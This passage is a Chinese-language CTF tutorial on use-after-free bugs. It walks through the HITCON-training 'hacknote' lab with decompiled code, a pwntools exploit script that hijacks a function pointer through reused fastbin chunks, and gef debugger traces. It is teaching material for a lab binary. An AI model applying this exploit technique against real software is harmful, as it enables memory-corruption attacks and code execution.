\u60ac\u7a7a\u6307\u9488 wild pointer \uff1a\u91ce\u6307\u9488\uff0c\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u8fc7\u7684\u6307\u9488 \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50 #include <stdio.h> #include <stdlib.h> typedef struct name { char * myname ; void ( * func )( char * str ); } NAME ; void myprint ( char * str ) { printf ( \"%s \\n \" , str ); } void printmyname () { printf ( \"call print my name \\n \" ); } int main () { NAME * a ; a = ( NAME * ) malloc ( sizeof ( struct name )); a -> func = myprint ; a -> myname = \"I can also use it\" ; a -> func ( \"this is my function\" ); // free without modify free ( a ); a -> func ( \"I can also use it\" ); // free with modify a -> func = printmyname ; a -> func ( \"this is my function\" ); // set NULL a = NULL ; printf ( \"this pogram will crash... \\n \" ); a -> func ( \"can not be printed...\" ); } \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b \u279c use_after_free git:(use_after_free) \u2717 ./use_after_free this is my function I can also use it call print my name this pogram will crash... [1] 38738 segmentation fault (core dumped) ./use_after_free \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 HITCON-training \u4e2d\u7684 lab 10 hacknote \u4e3a\u4f8b\u3002 \u529f\u80fd\u5206\u6790 \u00b6 \u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5206\u6790\u4e0b\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u5728\u7a0b\u5e8f\u7684\u5f00\u5934\u6709\u4e2a menu \u51fd\u6570\uff0c\u5176\u4e2d\u6709 puts ( \" 1. Add note \" ); puts ( \" 2. Delete note \" ); puts ( \" 3. Print note \" ); puts ( \" 4. Exit \" ); \u6545\u800c\u7a0b\u5e8f\u5e94\u8be5\u4e3b\u8981\u6709 3 \u4e2a\u529f\u80fd\u3002\u4e4b\u540e\u7a0b\u5e8f\u4f1a\u6839\u636e\u7528\u6237\u7684\u8f93\u5165\u6267\u884c\u76f8\u5e94\u7684\u529f\u80fd\u3002 add_note \u00b6 \u6839\u636e\u7a0b\u5e8f\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u6700\u591a\u53ef\u4ee5\u6dfb\u52a0 5 \u4e2a note\u3002\u6bcf\u4e2a note \u6709\u4e24\u4e2a\u5b57\u6bb5 put \u4e0e content\uff0c\u5176\u4e2d put \u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u51fd\u6570\uff0c\u5176\u51fd\u6570\u4f1a\u8f93\u51fa content \u5177\u4f53\u7684\u5185\u5bb9\u3002 unsigned int add_note () { note * v0 ; // ebx signed int i ; // [esp+Ch] [ebp-1Ch] int size ; // [esp+10h] [ebp-18h] char buf ; // [esp+14h] [ebp-14h] unsigned int v5 ; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword ( 0x14u ); if ( count <= 5 ) { for ( i = 0 ; i <= 4 ; ++ i ) { if ( ! notelist [ i ] ) { notelist [ i ] = malloc ( 8u ); if ( ! notelist [ i ] ) { puts ( \"Alloca Error\" ); exit ( -1 ); } notelist [ i ] -> put = print_note_content ; printf ( \"Note size :\" ); read ( 0 , & buf , 8u ); size = atoi ( & buf ); v0 = notelist [ i ]; v0 -> content = malloc ( size ); if ( ! notelist [ i ] -> content ) { puts ( \"Alloca Error\" ); exit ( -1 ); } printf ( \"Content :\" ); read ( 0 , notelist [ i ] -> content , size ); puts ( \"Success !\" ); ++ count ; return __readgsdword ( 0x14u ) ^ v5 ; } } } else { puts ( \"Full\" ); } return __readgsdword ( 0x14u ) ^ v5 ; } print_note \u00b6 print_note \u5c31\u662f\u7b80\u5355\u7684\u6839\u636e\u7ed9\u5b9a\u7684 note \u7684\u7d22\u5f15\u6765\u8f93\u51fa\u5bf9\u5e94\u7d22\u5f15\u7684 note \u7684\u5185\u5bb9\u3002 unsigned int print_note () { int v1 ; // [esp+4h] [ebp-14h] char buf ; // [esp+8h] [ebp-10h] unsigned int v3 ; // [esp+Ch] [ebp-Ch] v3 = __readgsdword ( 0x14u ); printf ( \"Index :\" ); read ( 0 , & buf , 4u ); v1 = atoi ( & buf ); if ( v1 < 0 || v1 >= count ) { puts ( \"Out of bound!\" ); _exit ( 0 ); } if ( notelist [ v1 ] ) notelist [ v1 ] -> put ( notelist [ v1 ]); return __readgsdword ( 0x14u ) ^ v3 ; } delete_note \u00b6 delete_note \u4f1a\u6839\u636e\u7ed9\u5b9a\u7684\u7d22\u5f15\u6765\u91ca\u653e\u5bf9\u5e94\u7684 note\u3002\u4f46\u662f\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728 \u5220\u9664\u7684\u65f6\u5019\uff0c\u53ea\u662f\u5355\u7eaf\u8fdb\u884c\u4e86 free\uff0c\u800c\u6ca1\u6709\u8bbe\u7f6e\u4e3a NULL\uff0c\u90a3\u4e48\u663e\u7136\uff0c\u8fd9\u91cc\u662f\u5b58\u5728 Use After Free \u7684\u60c5\u51b5\u7684\u3002 unsigned int del_note () { int v1 ; // [esp+4h] [ebp-14h] char buf ; // [esp+8h] [ebp-10h] unsigned int v3 ; // [esp+Ch] [ebp-Ch] v3 = __readgsdword ( 0x14u ); printf ( \"Index :\" ); read ( 0 , & buf , 4u ); v1 = atoi ( & buf ); if ( v1 < 0 || v1 >= count ) { puts ( \"Out of bound!\" ); _exit ( 0 ); } if ( notelist [ v1 ] ) { free ( notelist [ v1 ] -> content ); free ( notelist [ v1 ]); puts ( \"Success\" ); } return __readgsdword ( 0x14u ) ^ v3 ; } \u5229\u7528\u5206\u6790 \u00b6 \u6211\u4eec\u53ef\u4ee5\u770b\u5230 Use After Free \u7684\u60c5\u51b5\u786e\u5b9e\u53ef\u80fd\u4f1a\u53d1\u751f\uff0c\u90a3\u4e48\u600e\u4e48\u53ef\u4ee5\u8ba9\u5b83\u53d1\u751f\u5e76\u4e14\u8fdb\u884c\u5229\u7528\u5462\uff1f\u9700\u8981\u540c\u65f6\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\u8fd8\u6709\u4e00\u4e2a magic \u51fd\u6570\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u6765\u901a\u8fc7 use after free \u6765\u4f7f\u5f97\u8fd9\u4e2a\u7a0b\u5e8f\u6267\u884c magic \u51fd\u6570\u5462\uff1f \u4e00\u4e2a\u5f88\u76f4\u63a5\u7684\u60f3\u6cd5\u662f\u4fee\u6539 note \u7684 put \u5b57\u6bb5\u4e3a magic \u51fd\u6570\u7684\u5730\u5740\uff0c\u4ece\u800c\u5b9e\u73b0\u5728\u6267\u884c print note \u7684\u65f6\u5019\u6267\u884c magic \u51fd\u6570\u3002 \u90a3\u4e48\u8be5\u600e\u4e48\u6267\u884c\u5462\uff1f \u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u6765\u770b\u4e00\u4e0b\u6bcf\u4e00\u4e2a note \u751f\u6210\u7684\u5177\u4f53\u6d41\u7a0b \u7a0b\u5e8f\u7533\u8bf7 8 \u5b57\u8282\u5185\u5b58\u7528\u6765\u5b58\u653e note \u4e2d\u7684 put \u4ee5\u53ca content \u6307\u9488\u3002 \u7a0b\u5e8f\u6839\u636e\u8f93\u5165\u7684 size \u6765\u7533\u8bf7\u6307\u5b9a\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u7136\u540e\u7528\u6765\u5b58\u50a8 content\u3002 +-----------------+ | put | +-----------------+ | content | size +-----------------+------------------->+----------------+ | real | | content | | | +----------------+ \u90a3\u4e48\uff0c\u6839\u636e\u6211\u4eec\u4e4b\u524d\u5728\u5806\u7684\u5b9e\u73b0\u4e2d\u6240\u5b66\u5230\u7684\uff0c\u663e\u7136 note \u662f\u4e00\u4e2a fastbin chunk\uff08\u5927\u5c0f\u4e3a 16 \u5b57\u8282\uff09\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u5e0c\u671b\u4e00\u4e2a note \u7684 put \u5b57\u6bb5\u4e3a magic \u7684\u51fd\u6570\u5730\u5740\uff0c\u90a3\u4e48\u6211\u4eec\u5fc5\u987b\u60f3\u529e\u6cd5\u8ba9\u67d0\u4e2a note \u7684 put \u6307\u9488\u88ab\u8986\u76d6\u4e3a magic \u5730\u5740\u3002\u7531\u4e8e\u7a0b\u5e8f\u4e2d\u53ea\u6709\u552f\u4e00\u7684\u5730\u65b9\u5bf9 put \u8fdb\u884c\u8d4b\u503c\u3002\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u5229\u7528\u5199 real content \u7684\u65f6\u5019\u6765\u8fdb\u884c\u8986\u76d6\u3002\u5177\u4f53\u91c7\u7528\u7684\u601d\u8def\u5982\u4e0b \u7533\u8bf7 note0\uff0creal content size \u4e3a 16\uff08\u5927\u5c0f\u4e0e note \u5927\u5c0f\u6240\u5728\u7684 bin \u4e0d\u4e00\u6837\u5373\u53ef\uff09 \u7533\u8bf7 note1\uff0creal content size \u4e3a 16\uff08\u5927\u5c0f\u4e0e note \u5927\u5c0f\u6240\u5728\u7684 bin \u4e0d\u4e00\u6837\u5373\u53ef\uff09 \u91ca\u653e note0 \u91ca\u653e note1 \u6b64\u65f6\uff0c\u5927\u5c0f\u4e3a 16 \u7684 fast bin chunk \u4e2d\u94fe\u8868\u4e3a note1->note0 \u7533\u8bf7 note2\uff0c\u5e76\u4e14\u8bbe\u7f6e real content \u7684\u5927\u5c0f\u4e3a 8\uff0c\u90a3\u4e48\u6839\u636e\u5806\u7684\u5206\u914d\u89c4\u5219 note2 \u5176\u5b9e\u4f1a\u5206\u914d note1 \u5bf9\u5e94\u7684\u5185\u5b58\u5757\u3002 real content \u5bf9\u5e94\u7684 chunk \u5176\u5b9e\u662f note0\u3002 \u5982\u679c\u6211\u4eec\u8fd9\u65f6\u5019\u5411 note2 real content \u7684 chunk \u90e8\u5206\u5199\u5165 magic \u7684\u5730\u5740\uff0c\u90a3\u4e48\u7531\u4e8e\u6211\u4eec\u6ca1\u6709 note0 \u4e3a NULL\u3002\u5f53\u6211\u4eec\u518d\u6b21\u5c1d\u8bd5\u8f93\u51fa note0 \u7684\u65f6\u5019\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u8c03\u7528 magic \u51fd\u6570\u3002 \u5229\u7528\u811a\u672c \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './hacknote' ) def addnote ( size , content ): r . recvuntil ( \":\" ) r . sendline ( \"1\" ) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def delnote ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"2\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) def printnote ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"3\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) #gdb.attach(r) magic = 0x08048986 addnote ( 32 , \"aaaa\" ) # add note 0 addnote ( 32 , \"ddaa\" ) # add note 1 delnote ( 0 ) # delete note 0 delnote ( 1 ) # delete note 1 addnote ( 8 , p32 ( magic )) # add note 2 printnote ( 0 ) # print note 0 r . interactive () \u6211\u4eec\u53ef\u4ee5\u5177\u4f53\u770b\u4e00\u4e0b\u6267\u884c\u7684\u6d41\u7a0b\uff0c\u9996\u5148\u5148\u4e0b\u65ad\u70b9 \u4e24\u5904 malloc \u4e0b\u65ad\u70b9 gef\u27a4 b *0x0804875C Breakpoint 1 at 0x804875c gef\u27a4 b *0x080486CA Breakpoint 2 at 0x80486ca \u4e24\u5904 free \u4e0b\u65ad\u70b9 gef\u27a4 b *0x08048893 Breakpoint 3 at 0x8048893 gef\u27a4 b *0x080488A9 Breakpoint 4 at 0x80488a9 \u7136\u540e\u7ee7\u7eed\u6267\u884c\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u7533\u8bf7 note0 \u65f6\uff0c\u6240\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5757\u5730\u5740\u4e3a 0x0804b008\u3002\uff08eax \u5b58\u50a8\u51fd\u6570\u8fd4\u56de\u503c\uff09 $eax : 0x0804b008 \u2192 0x00000000 $ebx : 0x00000000 $ecx : 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b008 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xf7fac000 \u2192 0x001b1db0 $eip : 0x080486cf \u2192 <add_note+89> add esp, 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500 0x80486c2 <add_note+76> add DWORD PTR [eax], eax 0x80486c4 <add_note+78> add BYTE PTR [ebx+0x86a0cec], al 0x80486ca <add_note+84> call 0x80484e0 <malloc@plt> \u2192 0x80486cf <add_note+89> add esp, 0x10 0x80486d2 <add_note+92> mov edx, eax 0x80486d4 <add_note+94> mov eax, DWORD PTR [ebp-0x1c] 0x80486d7 <add_note+97> mov DWORD PTR [eax*4+0x804a070], edx \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcf10', 'l8'] 8 0xffffcf10\u2502+0x00: 0x00000008 \u2190 $esp 0xffffcf14\u2502+0x04: 0x00000000 0xffffcf18\u2502+0x08: 0xf7e29ef5 \u2192 <strtol+5> add eax, 0x18210b 0xffffcf1c\u2502+0x0c: 0xf7e27260 \u2192 <atoi+16> add esp, 0x1c 0xffffcf20\u2502+0x10: 0xffffcf58 \u2192 0xffff0a31 \u2192 0x00000000 0xffffcf24\u2502+0x14: 0x00000000 0xffffcf28\u2502+0x18: 0x0000000a 0xffffcf2c\u2502+0x1c: 0x00000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 ---Type <return> to continue, or q <return> to quit--- [#0] 0x80486cf \u2192 Name: add_note() [#1] 0x8048ac5 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 heap chunk 0x0804b008 UsedChunk(addr=0x804b008, size=0x10) Chunk size: 16 (0x10) Usable size: 12 (0xc) Previous chunk size: 0 (0x0) PREV_INUSE flag: On IS_MMAPPED flag: Off NON_MAIN_ARENA flag: Off \u7533\u8bf7 note 0 \u7684 content \u7684\u5730\u5740\u4e3a 0x0804b018 $eax : 0x0804b018 \u2192 0x00000000 $ebx : 0x0804b008 \u2192 0x0804865b \u2192 <print_note_content+0> push ebp $ecx : 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b018 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000020 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xf7fac000 \u2192 0x001b1db0 $eip : 0x08048761 \u2192 <add_note+235> add esp, 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500 0x8048752 <add_note+220> mov al, ds:0x458b0804 0x8048757 <add_note+225> call 0x581173df 0x804875c <add_note+230> call 0x80484e0 <malloc@plt> \u2192 0x8048761 <add_note+235> add esp, 0x10 0x8048764 <add_note+238> mov DWORD PTR [ebx+0x4], eax 0x8048767 <add_note+241> mov eax, DWORD PTR [ebp-0x1c] 0x804876a <add_note+244> mov eax, DWORD PTR [eax*4+0x804a070] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcf10', 'l8'] 8 0xffffcf10\u2502+0x00: 0x00000020 \u2190 $esp 0xffffcf14\u2502+0x04: 0xffffcf34 \u2192 0xf70a3233 0xffffcf18\u2502+0x08: 0x00000008 0xffffcf1c\u2502+0x0c: 0xf7e27260 \u2192 <atoi+16> add esp, 0x1c 0xffffcf20\u2502+0x10: 0xffffcf58 \u2192 0xffff0a31 \u2192 0x00000000 0xffffcf24\u2502+0x14: 0x00000000 0xffffcf28\u2502+0x18: 0x0000000a 0xffffcf2c\u2502+0x1c: 0x00000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 ---Type <return> to continue, or q <return> to quit--- [#0] 0x8048761 \u2192 Name: add_note() [#1] 0x8048ac5 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 heap chunk 0x0804b018 UsedChunk(addr=0x804b018, size=0x28) Chunk size: 40 (0x28) Usable size: 36 (0x24) Previous chunk size: 0 (0x0) PREV_INUSE flag: On IS_MMAPPED flag: Off NON_MAIN_ARENA flag: Off \u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230 note1 \u7684\u5730\u5740\u4ee5\u53ca\u5176 content \u7684\u5730\u5740\u5206\u522b\u4e3a 0x0804b040 \u548c 0x0804b050\u3002 \u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u770b\u5230 note0 \u4e0e note1 \u5bf9\u5e94\u7684 content \u786e\u5b9e\u662f\u76f8\u5e94\u7684\u5185\u5b58\u5757\u3002 gef\u27a4 grep aaaa [+] Searching 'aaaa' in memory [+] In '[heap]'(0x804b000-0x806c000), permission=rw- 0x804b018 - 0x804b01c \u2192 \"aaaa\" gef\u27a4 grep ddaa [+] Searching 'ddaa' in memory [+] In '[heap]'(0x804b000-0x806c000), permission=rw- 0x804b050 - 0x804b054 \u2192 \"ddaa\" \u4e0b\u9762\u5c31\u662f free \u7684\u8fc7\u7a0b\u4e86\u3002\u6211\u4eec\u53ef\u4ee5\u4f9d\u6b21\u53d1\u73b0\u9996\u5148\uff0cnote0 \u7684 content \u88ab free \u2192 0x8048893 <del_note+143> call 0x80484c0 <free@plt> \u21b3 0x80484c0 <free@plt+0> jmp DWORD PTR ds:0x804a018 0x80484c6 <free@plt+6> push 0x18 0x80484cb <free@plt+11> jmp 0x8048480 0x80484d0 <__stack_chk_fail@plt+0> jmp DWORD PTR ds:0x804a01c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcf20', 'l8'] 8 0xffffcf20\u2502+0x00: 0x0804b018 \u2192 \"aaaa\" \u2190 $esp \u7136\u540e\u662f note0 \u672c\u8eab \u2192 0x80488a9 <del_note+165> call 0x80484c0 <free@plt> \u21b3 0x80484c0 <free@plt+0> jmp DWORD PTR ds:0x804a018 0x80484c6 <free@plt+6> push 0x18 0x80484cb <free@plt+11> jmp 0x8048480 0x80484d0 <__stack_chk_fail@plt+0> jmp DWORD PTR ds:0x804a01c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500